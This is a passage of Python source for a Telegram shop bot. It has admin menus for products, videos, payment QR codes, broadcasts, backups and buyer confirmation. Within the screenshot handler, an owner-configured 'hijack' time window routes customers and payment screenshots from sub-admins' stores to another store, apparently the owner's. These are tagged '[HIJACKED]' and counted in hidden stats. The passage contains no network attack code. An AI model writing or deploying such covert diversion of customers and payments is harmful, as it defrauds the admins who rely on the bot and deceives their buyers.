                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
                return
            try:
                if m_type == "photo": bot.send_photo(uid, f_id, caption=txt)
                elif m_type == "video": bot.send_video(uid, f_id, caption=txt)
                elif m_type == "document": bot.send_document(uid, f_id, caption=txt)
                else: bot.send_message(uid, txt)
            except Exception as e:
                print(f"preview err: {e}")
            return
        if data == "adm_autobc_set_time":
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("10s", callback_data="adm_autobc_t_10"),
                   InlineKeyboardButton("30s", callback_data="adm_autobc_t_30"),
                   InlineKeyboardButton("1m", callback_data="adm_autobc_t_60"))
            mk.row(InlineKeyboardButton("5m", callback_data="adm_autobc_t_300"),
                   InlineKeyboardButton("30m", callback_data="adm_autobc_t_1800"),
                   InlineKeyboardButton("1h", callback_data="adm_autobc_t_3600"))
            mk.row(InlineKeyboardButton("6h", callback_data="adm_autobc_t_21600"),
                   InlineKeyboardButton("24h", callback_data="adm_autobc_t_86400"))
            mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu"))
            update_admin_panel(uid, "⏱️ Select interval:", mk); return
        if data.startswith("adm_autobc_t_"):
            r["auto_bc"]["interval_seconds"] = int(data.split("_")[3])
            save_db(); call.data = "adm_autobc_menu"; _store_admin_handle(call); return
        if data == "adm_autobc_custom_time":
            user_states[uid] = "WAITING_AUTOBC_CUSTOM_TIME"
            update_admin_panel(uid, "✍️ Send timer in seconds (e.g. 45, 120, 900):",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
            return

    if is_owner(uid) and data == "adm_send_custom_bc":
        user_states[uid] = "WAITING_CUSTOM_BROADCAST"
        update_admin_panel(uid, "🚀 Send message for GLOBAL broadcast:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
    if is_owner(uid) and data == "adm_buyers_bc_menu":
        user_states[uid] = "WAITING_BUYERS_BROADCAST"
        update_admin_panel(uid, "👑 Send message to YOUR buyers:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return

    if data == "adm_start_vids_menu":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
        mk.row(InlineKeyboardButton("⚙️ Manage / Delete Videos", callback_data="adm_del_start_vid_list"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, f"🎞️ **Start Videos**\nTotal: {len(r.get('start_videos',[]))}", mk); return
    if data == "adm_add_start_vid":
        user_states[uid] = "ADM_ADD_START_VID_MULTIPLE"
        update_admin_panel(uid, "📥 Send videos. Done when finished:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids"))); return
    if data == "adm_finish_start_vids":
        admin_panel_msgs.pop(uid, None)
        show_store_admin_menu(uid); return
    if data == "adm_del_start_vid_list":
        mk = InlineKeyboardMarkup()
        for i, v in enumerate(r.get("start_videos", [])):
            mk.row(InlineKeyboardButton(f"👀 {i+1}", callback_data=f"sv_see_{i}"),
                   InlineKeyboardButton(f"🗑️ {i+1}", callback_data=f"sv_del_{i}"))
        if r.get("start_videos"):
            mk.row(InlineKeyboardButton("💥 Delete All", callback_data="sv_del_all"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_start_vids_menu"))
        update_admin_panel(uid, "⚙️ Manage:", mk); return
    if data.startswith("sv_see_"):
        i = int(data.split("_")[2])
        vids = r.get("start_videos", [])
        if 0 <= i < len(vids):
            m = InlineKeyboardMarkup().row(InlineKeyboardButton("❌ Close", callback_data="del_msg"))
            bot.send_video(uid, vids[i], reply_markup=m); return
    if data.startswith("sv_del_"):
        if data == "sv_del_all": r["start_videos"] = []
        else:
            i = int(data.split("_")[2])
            if 0 <= i < len(r.get("start_videos", [])): r["start_videos"].pop(i)
        save_db(); call.data = "adm_del_start_vid_list"; _store_admin_handle(call); return

    if data == "adm_prod_menu":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("❇️ Add New Button", callback_data="adm_add_prod"))
        mk.row(InlineKeyboardButton("✏️ Edit Details / Link", callback_data="adm_prod_edit_list"))
        mk.row(InlineKeyboardButton("🔢 Change Position", callback_data="adm_prod_pos_list"))
        mk.row(InlineKeyboardButton("🎦 Add Videos", callback_data="adm_prod_add_vid_list"))
        mk.row(InlineKeyboardButton("⚙️ Manage Videos", callback_data="adm_prod_del_vid_list"))
        mk.row(InlineKeyboardButton("🗑️ Delete Button", callback_data="adm_del_prod_list"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, "🛍️ **Product Management:**", mk); return
    if data == "adm_add_prod":
        user_states[uid] = "ADM_ADD_PROD_NAME"
        update_admin_panel(uid, "✍️ Enter new Button Name (e.g. VIP):",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_menu"))); return
    if data == "adm_prod_edit_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"✏️ {p['name']}", callback_data=f"adm_p_edit_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Select:", mk); return
    if data.startswith("adm_p_edit_"):
        pid = data.split("_")[3]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p:
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("✏️ Name", callback_data=f"adm_ped_name_{pid}"))
            mk.row(InlineKeyboardButton("✏️ Description", callback_data=f"adm_ped_desc_{pid}"),
                   InlineKeyboardButton("🧹 Clear Desc", callback_data=f"adm_ped_cleardesc_{pid}"))
            mk.row(InlineKeyboardButton("🔗 Link", callback_data=f"adm_ped_link_{pid}"))
            mk.row(InlineKeyboardButton("💳 Payment Text", callback_data=f"adm_ped_paym_{pid}"))
            mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_edit_list"))
            update_admin_panel(uid, f"Editing `{p['name']}`\nDesc: {p.get('desc','')}\nLink: {p.get('link','')}", mk)
        return
    if data.startswith("adm_ped_cleardesc_"):
        pid = data.split("_")[3]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p: p["desc"] = ""
        save_db(); call.data = f"adm_p_edit_{pid}"; _store_admin_handle(call); return
    if data.startswith("adm_ped_name_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_NAME_{pid}"
        update_admin_panel(uid, "✍️ Send new name:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data.startswith("adm_ped_desc_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_DESC_{pid}"
        update_admin_panel(uid, "✍️ Send new desc:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data.startswith("adm_ped_link_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_LINK_{pid}"
        update_admin_panel(uid, "🔗 Send new link:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data.startswith("adm_ped_paym_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_PAYM_{pid}"
        update_admin_panel(uid, "💳 Payment text (or `skip`):",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"adm_p_edit_{pid}"))); return
    if data == "adm_prod_pos_list":
        mk = InlineKeyboardMarkup()
        for p in sorted(r.get("products", []), key=lambda x: x.get("position", 999)):
            mk.row(InlineKeyboardButton(f"#{p.get('position',999)} ➡️ {p['name']}", callback_data=f"adm_p_pos_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "🔢 Click then send new number:", mk); return
    if data.startswith("adm_p_pos_"):
        pid = data.split("_")[3]; user_states[uid] = f"EDIT_P_POS_{pid}"
        update_admin_panel(uid, "🔢 New position:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_pos_list"))); return
    if data == "adm_prod_add_vid_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"🎦 {p['name']}", callback_data=f"adm_p_addvid_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Add videos to:", mk); return
    if data.startswith("adm_p_addvid_"):
        pid = data.split("_")[3]; user_states[uid] = f"ADM_UPL_PROD_VID_MULTIPLE_{pid}"
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("✅ Done", callback_data=f"adm_p_finish_{pid}"))
        mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="adm_prod_add_vid_list"))
        update_admin_panel(uid, "📥 Send videos. Done when finished:", mk); return
    if data.startswith("adm_p_finish_"):
        admin_panel_msgs.pop(uid, None)
        show_store_admin_menu(uid); return
    if data == "adm_prod_del_vid_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"⚙️ ({len(p.get('videos',[]))}) {p['name']}", callback_data=f"adm_p_mngv_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Manage videos:", mk); return
    if data.startswith("adm_p_mngv_"):
        pid = data.split("_")[3]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p:
            mk = InlineKeyboardMarkup()
            for i, v in enumerate(p.get("videos", [])):
                mk.row(InlineKeyboardButton(f"👀 {i+1}", callback_data=f"pv_see_{pid}_{i}"),
                       InlineKeyboardButton(f"🗑️ {i+1}", callback_data=f"pv_del_{pid}_{i}"))
            if p.get("videos"):
                mk.row(InlineKeyboardButton("💥 Delete All", callback_data=f"pv_dall_{pid}"))
            mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_del_vid_list"))
            update_admin_panel(uid, f"Videos of `{p['name']}`:", mk)
        return
    if data.startswith("pv_see_"):
        _, _, pid, i = data.split("_")
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p and int(i) < len(p.get("videos", [])):
            m = InlineKeyboardMarkup().row(InlineKeyboardButton("❌ Close", callback_data="del_msg"))
            bot.send_video(uid, p["videos"][int(i)], reply_markup=m); return
    if data.startswith("pv_del_"):
        _, _, pid, i = data.split("_")
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p and int(i) < len(p.get("videos", [])): p["videos"].pop(int(i))
        save_db(); call.data = f"adm_p_mngv_{pid}"; _store_admin_handle(call); return
    if data.startswith("pv_dall_"):
        pid = data.split("_")[2]
        p = next((x for x in r.get("products", []) if x["id"] == pid), None)
        if p: p["videos"] = []
        save_db(); call.data = f"adm_p_mngv_{pid}"; _store_admin_handle(call); return
    if data == "adm_del_prod_list":
        mk = InlineKeyboardMarkup()
        for p in r.get("products", []):
            mk.row(InlineKeyboardButton(f"🗑️ {p['name']}", callback_data=f"adm_del_p_{p['id']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="adm_prod_menu"))
        update_admin_panel(uid, "Delete:", mk); return
    if data.startswith("adm_del_p_"):
        pid = data.split("_")[3]
        r["products"] = [x for x in r.get("products", []) if x["id"] != pid]
        save_db(); call.data = "adm_del_prod_list"; _store_admin_handle(call); return
    if data == "adm_edit_welcome":
        user_states[uid] = "ADM_SET_WELCOME"
        update_admin_panel(uid, "📝 Send new Welcome text (`{name}` = user name):",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
    if data == "adm_set_how_vid":
        user_states[uid] = "ADM_SET_HOW_VID"
        update_admin_panel(uid, "🎥 Send 'How To Use' video:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
    if data == "adm_pay_config_menu":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("💳 Set Payment QR/Photo", callback_data="adm_set_pay_photo"))
        mk.row(InlineKeyboardButton("✏️ Edit Payment Text", callback_data="adm_edit_pay_msg"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        update_admin_panel(uid, "💳 **Global Payment Config**", mk); return
    if data == "adm_set_pay_photo":
        user_states[uid] = "ADM_SET_PAY_PHOTO"
        update_admin_panel(uid, "💳 Send QR photo:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_pay_config_menu"))); return
    if data == "adm_edit_pay_msg":
        user_states[uid] = "ADM_SET_PAY_MSG_TEXT"
        update_admin_panel(uid, f"✍️ Current: `{r.get('payment_msg')}`\n\nNew payment text:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_pay_config_menu"))); return
    if data == "adm_view_buyers_list":
        buyers = r.get("buyers", [])
        if not buyers: txt = "📦 No buyers yet."
        else:
            txt = "📦 **Buyers (last 20):**\n\n"
            for i, b in enumerate(buyers[-20:], 1):
                txt += f"{i}. {b.get('name')} @{b.get('username')} (`{b.get('user_id')}`)\n   🛍️ {b.get('product')} | {b.get('date')}\n"
        mk = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, txt, mk); return
    if data == "adm_backup_menu":
        js = json.dumps(DB_STATE, default=str)
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("📥 Restore", callback_data="adm_restore_prompt"))
        mk.row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, f"💾 **Backup:**\n`{js[:3500]}`", mk); return
    if data == "adm_restore_prompt":
        user_states[uid] = "WAITING_RESTORE_CODE"
        update_admin_panel(uid, "📥 Send backup JSON:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_backup_menu"))); return
    if data == "adm_unblock_menu":
        mk = InlineKeyboardMarkup()
        for b in r.get("blocked_users", []):
            mk.row(InlineKeyboardButton(f"🔓 Unblock {b}", callback_data=f"adm_unblock_exec_{b}"))
        mk.row(InlineKeyboardButton("🔙 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, "🛡️ Unblock:", mk); return
    if data.startswith("adm_unblock_exec_"):
        b = int(data.split("_")[3])
        if b in r.get("blocked_users", []): r["blocked_users"].remove(b)
        save_db(); call.data = "adm_unblock_menu"; _store_admin_handle(call); return

    if data.startswith("adm_confirm_"):
        parts = data.split("_")
        s_uid, pid, cust = parts[2], parts[3], int(parts[4])
        if str(s_uid) != str(uid): return
        sr = get_store(s_uid)
        prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
        link = prod.get("link", "No link") if prod else "No link"
        pname = prod.get("name", "Product") if prod else "Product"
        try:
            u = bot.get_chat(cust); nm = u.first_name or "User"; un = u.username or "unknown"
        except Exception:
            nm, un = "User", "unknown"
        sr["buyers"].append({"user_id": cust, "name": nm, "username": un, "product": pname,
                             "date": datetime.datetime.now(IST).strftime("%Y-%m-%d %H:%M")})
        t = today_str()
        st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
        st["accepted"] += 1
        st["by_product"][pname] = st["by_product"].get(pname, 0) + 1
        save_db()
        bot.send_message(cust, f"✅ **Payment Confirmed!**\n\nLink:\n🔗 {link}")
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n✅ **Confirmed & Link Sent!**",
                                     chat_id=uid, message_id=call.message.message_id)
        except Exception: pass
        return
    if data.startswith("adm_reject_"):
        parts = data.split("_"); s_uid, cust = parts[2], int(parts[3])
        if str(s_uid) != str(uid): return
        bot.send_message(cust, get_store(s_uid).get("reject_msg", DEFAULT_REJECT))
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n❌ **Rejected**",
                                     chat_id=uid, message_id=call.message.message_id)
        except Exception: pass
        return
    if data.startswith("adm_block_"):
        parts = data.split("_"); s_uid, cust = parts[2], int(parts[3])
        if str(s_uid) != str(uid): return
        if cust not in get_store(s_uid).get("blocked_users", []):
            get_store(s_uid)["blocked_users"].append(cust); save_db()
        try:
            bot.edit_message_caption(caption=f"{call.message.caption}\n\n🚫 **Blocked!**",
                                     chat_id=uid, message_id=call.message.message_id)
        except Exception: pass
        return

def do_single_store_broadcast(target_store, message):
    ok = fail = 0
    for u_id in target_store.get("users", []):
        if u_id in target_store.get("blocked_users", []): continue
        try:
            if message.content_type == 'text': bot.send_message(u_id, message.text)
            elif message.content_type == 'photo': bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption)
            elif message.content_type == 'video': bot.send_video(u_id, message.video.file_id, caption=message.caption)
            elif message.content_type == 'document': bot.send_document(u_id, message.document.file_id, caption=message.caption)
            ok += 1
        except Exception: fail += 1
    return ok, fail

def do_global_broadcast(message):
    all_users = set()
    for r_id, r_data in DB_STATE.get("stores", {}).items():
        if int(r_id) == OWNER_ID:
            for u in r_data.get("users", []):
                if u not in r_data.get("blocked_users", []): all_users.add(u)
    ok = fail = 0
    for u_id in all_users:
        try:
            if message.content_type == 'text': bot.send_message(u_id, message.text)
            elif message.content_type == 'photo': bot.send_photo(u_id, message.photo[-1].file_id, caption=message.caption)
            elif message.content_type == 'video': bot.send_video(u_id, message.video.file_id, caption=message.caption)
            elif message.content_type == 'document': bot.send_document(u_id, message.document.file_id, caption=message.caption)
            ok += 1
        except Exception: fail += 1
    return ok, fail

def parse_duration(txt):
    txt = (txt or "").strip().lower()
    if txt in ("0", "remove", "revoke"): return 0
    sign = -1 if txt.startswith("-") else 1
    t = txt.lstrip("+-")
    mult = 1
    if t.endswith("s"): mult = 1; t = t[:-1]
    elif t.endswith("m"): mult = 60; t = t[:-1]
    elif t.endswith("h"): mult = 3600; t = t[:-1]
    elif t.endswith("d"): mult = 86400; t = t[:-1]
    try: return sign * int(float(t) * mult)
    except Exception: return None

@bot.message_handler(content_types=['photo', 'video', 'text', 'document'])
def handle_all_inputs(message):
    uid = message.chat.id
    state = user_states.get(uid, "")

    if can_use_panel(uid) and message.reply_to_message:
        rep = message.reply_to_message.text or message.reply_to_message.caption or ""
        m = re.search(r'`(\d+)`', rep)
        if m:
            try:
                bot.copy_message(chat_id=int(m.group(1)), from_chat_id=uid, message_id=message.message_id)
                bot.reply_to(message, "✅ Reply sent!")
            except Exception as e:
                bot.reply_to(message, f"❌ {e}")
            return

    if state.startswith("WAITING_REPORT_"):
        ts, _ = get_effective_store(state.replace("WAITING_REPORT_", ""), uid)
        ds = ts.get("uid", OWNER_ID) if ts else OWNER_ID
        user_states.pop(uid, None)
        bot.send_message(uid, "✅ Report sent to admin.")
        if can_use_panel(uid): ds = uid
        un = message.from_user.username
        tag = f"@{un}" if un else "No Username"
        bot.send_message(int(ds), f"📩 **Report from {tag} (`{uid}`):**\n\n{message.text}\n\n*Reply to forward.*", parse_mode="Markdown")
        return

    if state.startswith("WAITING_SCREENSHOT_"):
        parts = state.split("_")
        osid, pid = parts[2], parts[3]
        ts, is_hij = get_effective_store(osid, uid)
        ds = ts.get("uid", OWNER_ID) if ts else OWNER_ID
        if can_use_panel(uid): is_hij = False; ds = uid; osid = uid
        if message.content_type == 'photo':
            sr = get_store(ds)
            user_states.pop(uid, None)
            bot.send_message(uid, "⏳ Checking payment...")
            prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
            pname = prod["name"] if prod else "Unknown"
            t = today_str()
            st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
            st["requests"] += 1
            if not can_use_panel(uid): record_hijack_stat(osid, pname)
            save_db()
            un = message.from_user.username
            tag = f"@{un}" if un else "No Username"
            nm = message.from_user.first_name or "User"
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{ds}_{pid}_{uid}"),
                   InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{ds}_{uid}"))
            mk.row(InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{ds}_{uid}"))
            ci = f"📸 **New Payment!**\n\n🛍️ {pname}\n👤 {tag}\n📛 {nm}\n🆔 `{uid}`"
            if is_hij and str(osid) != str(OWNER_ID) and not can_use_panel(uid):
                oa = get_store(osid)
                an = oa.get("name") if oa else "Admin"
                ci += f"\n\n🌙 **[HIJACKED]** From: {an} (`{osid}`)"
            try: bot.send_photo(int(ds), message.photo[-1].file_id, caption=ci, reply_markup=mk)
            except Exception: pass
        return

    if can_use_panel(uid):
        rr = get_store(uid)
        if not is_owner(uid) and rr and rr.get("expires_at") is not None and now() > rr["expires_at"]: return
        if state and not state.startswith("WAITING_REPORT_") and not state.startswith("WAITING_SCREENSHOT_"):
            try: bot.delete_message(uid, message.message_id)
            except Exception: pass
        r = get_store(uid)
        if r is None:
            ensure_store(uid, role="owner" if is_owner(uid) else "admin")
            r = get_store(uid)

        # AUTO BC MESSAGE INPUT — NO parse_mode
        if state == "WAITING_AUTOBC_MSG":
            user_states.pop(uid, None)
            m_type = message.content_type
            f_id = None
            txt = message.caption or message.text or ""
            if m_type == "photo": f_id = message.photo[-1].file_id
            elif m_type == "video": f_id = message.video.file_id
            elif m_type == "document": f_id = message.document.file_id
            elif m_type == "text": pass
            else:
                update_admin_panel(uid, "❌ Unsupported type.",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_autobc_menu")))
                return
            r["auto_bc"]["message_type"] = m_type
            r["auto_bc"]["file_id"] = f_id
            r["auto_bc"]["text"] = txt
            save_db()
            print(f"✅ Auto BC msg saved: type={m_type}, len={len(txt)}")
            bc = r["auto_bc"]
            iv = bc.get("interval_seconds", 60)
            ivt = f"{iv}s" if iv < 60 else (f"{iv//60}m" if iv < 3600 else f"{iv//3600}h")
            stat = "🟢 ON" if bc.get("status") else "🔴 OFF"
            admin_panel_msgs.pop(uid, None)
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton("👁 Preview", callback_data="adm_autobc_preview"))
            if bc.get("status"): mk.row(InlineKeyboardButton("🔴 Turn OFF", callback_data="adm_autobc_toggle"))
            else: mk.row(InlineKeyboardButton("🟢 Turn ON Now", callback_data="adm_autobc_toggle"))
            mk.row(InlineKeyboardButton("⏱️ Change Interval", callback_data="adm_autobc_set_time"))
            mk.row(InlineKeyboardButton("✏️ Change Message", callback_data="adm_autobc_set_msg"))
            mk.row(InlineKeyboardButton("🔙 Auto BC Menu", callback_data="adm_autobc_menu"))
            update_admin_panel(uid, f"✅ **Auto BC Saved!**\n\nType: `{m_type}`\nLength: `{len(txt)}`\nInterval: `{ivt}`\nStatus: {stat}", mk)
            return

        if state == "WAITING_HIJACK_TIME" and message.text and is_owner(uid):
            try:
                parts = message.text.strip().split("-")
                if len(parts) == 2:
                    cfg = DB_STATE.setdefault("command_hijack_config", {})
                    cfg["start_time"] = parts[0].strip()
                    cfg["end_time"] = parts[1].strip()
                    save_db(); user_states.pop(uid, None)
                    update_admin_panel(uid, f"✅ Time set: `{parts[0].strip()}` - `{parts[1].strip()}`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu")))
                else:
                    update_admin_panel(uid, "❌ Use `00:00-02:00`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
            except Exception: pass
            return

        if state == "OWN_ADD_ADMIN_ID" and message.text and is_owner(uid):
            try:
                nid = int(message.text.strip())
                if get_store(nid):
                    update_admin_panel(uid, f"⚠️ ID `{nid}` exists.",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage", callback_data="own_admins_menu")))
                else:
                    user_states[uid] = f"OWN_ADD_ADMIN_EXP_{nid}"
                    update_admin_panel(uid, f"✅ ID `{nid}`. Now expiry: `30`, `10m`, `2h`, `1d`",
                                       InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
            except Exception:
                update_admin_panel(uid, "❌ Invalid ID.",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage", callback_data="own_admins_menu")))
            return
        if state.startswith("OWN_ADD_ADMIN_EXP_") and is_owner(uid):
            nid = int(state.replace("OWN_ADD_ADMIN_EXP_", ""))
            dur = parse_duration(message.text or "")
            if dur is not None:
                exp = now() + max(dur, 1) if dur > 0 else None
                ensure_store(nid, role="admin", name=f"Admin {nid}", username="", expires_at=exp)
                save_db(); user_states.pop(uid, None)
                update_admin_panel(uid, f"✅ Admin `{nid}` added.",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage", callback_data="own_admins_menu")))
            else:
                update_admin_panel(uid, "❌ Invalid duration.",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
            return
        if state.startswith("OWN_EXP_IN_") and is_owner(uid):
            target = state.replace("OWN_EXP_IN_", "")
            a = get_store(target)
            if a:
                dur = parse_duration(message.text or "")
                if dur == 0: a["expires_at"] = now()
                elif dur is not None:
                    cur = a.get("expires_at") or now()
                    a["expires_at"] = max(cur + dur, now())
                else:
                    update_admin_panel(uid, "❌ Invalid.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_exp_list")))
                    return
                save_db(); user_states.pop(uid, None)
                update_admin_panel(uid, f"✅ Expiry `{target}`: {fmt_expiry(a['expires_at'])}",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Manage", callback_data="own_admins_menu")))
            return

        if state.startswith("OWN_C_PAYPHOTO_") and message.content_type == 'photo' and is_owner(uid):
            t = state.replace("OWN_C_PAYPHOTO_", "")
            a = get_store(t); a["payment_photo"] = message.photo[-1].file_id
            save_db(); user_states.pop(uid, None)
            update_admin_panel(uid, f"✅ QR updated.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙", callback_data=f"own_content_sel_{t}")))
            return
        if state.startswith("OWN_C_PAYMSG_") and message.content_type == 'text' and is_owner(uid):
            t = state.replace("OWN_C_PAYMSG_", "")
            a = get_store(t); a["payment_msg"] = message.text
            save_db(); user_states.pop(uid, None)
            update_admin_panel(uid, "✅ Updated.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙", callback_data=f"own_content_sel_{t}")))
            return
        if state.startswith("OWN_C_TIMERBC_") and is_owner(uid):
            t = state.replace("OWN_C_TIMERBC_", "")
            a = get_store(t)
            m_type = message.content_type; f_id = None
            txt = message.caption or message.text or ""
            if m_type == "photo": f_id = message.photo[-1].file_id
            elif m_type == "video": f_id = message.video.file_id
            elif m_type == "document": f_id = message.document.file_id
            a["auto_bc"]["message_type"] = m_type
            a["auto_bc"]["file_id"] = f_id
            a["auto_bc"]["text"] = txt
            save_db(); user_states.pop(uid, None)
            update_admin_panel(uid, "✅ Timer updated.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙", callback_data=f"own_content_sel_{t}")))
            return
        if state.startswith("OWN_C_INSTANTBC_") and is_owner(uid):
            t = state.replace("OWN_C_INSTANTBC_", "")
            a = get_store(t)
            user_states.pop(uid, None)
            update_admin_panel(uid, "🚀 Sending...", None)
            ok, fail = do_single_store_broadcast(a, message)
            update_admin_panel(uid, f"✅ Sent: {ok} | Fail: {fail}", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙", callback_data=f"own_content_sel_{t}")))
            return

        if state == "ADM_ADD_START_VID_MULTIPLE" and message.content_type == 'video':
            r.setdefault("start_videos", []).append(message.video.file_id)
            save_db()
            update_admin_panel(uid, f"📥 Added: {len(r['start_videos'])}",
                               InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data="adm_finish_start_vids")))
            return
        if state.startswith("ADM_UPL_PROD_VID_MULTIPLE_") and message.content_type == 'video':
            pid = state.replace("ADM_UPL_PROD_VID_MULTIPLE_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p:
                p.setdefault("videos", []).append(message.video.file_id)
                save_db()
                update_admin_panel(uid, f"📥 Total: {len(p['videos'])}",
                                   InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Done", callback_data=f"adm_p_finish_{pid}")))
            return
        if state.startswith("EDIT_P_NAME_") and message.text:
            pid = state.replace("EDIT_P_NAME_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["name"] = message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_DESC_") and message.text:
            pid = state.replace("EDIT_P_DESC_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["desc"] = message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_LINK_") and message.text:
            pid = state.replace("EDIT_P_LINK_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["link"] = message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_PAYM_") and message.text:
            pid = state.replace("EDIT_P_PAYM_", "")
            p = next((x for x in r.get("products", []) if x["id"] == pid), None)
            if p: p["pay_msg"] = "" if message.text.strip().lower() == "skip" else message.text; save_db()
            user_states.pop(uid, None); admin_panel_msgs.pop(uid, None); show_store_admin_menu(uid); return
        if state.startswith("EDIT_P_POS_") and message.text:
            pid = state.replace("EDIT_P_POS_", "")
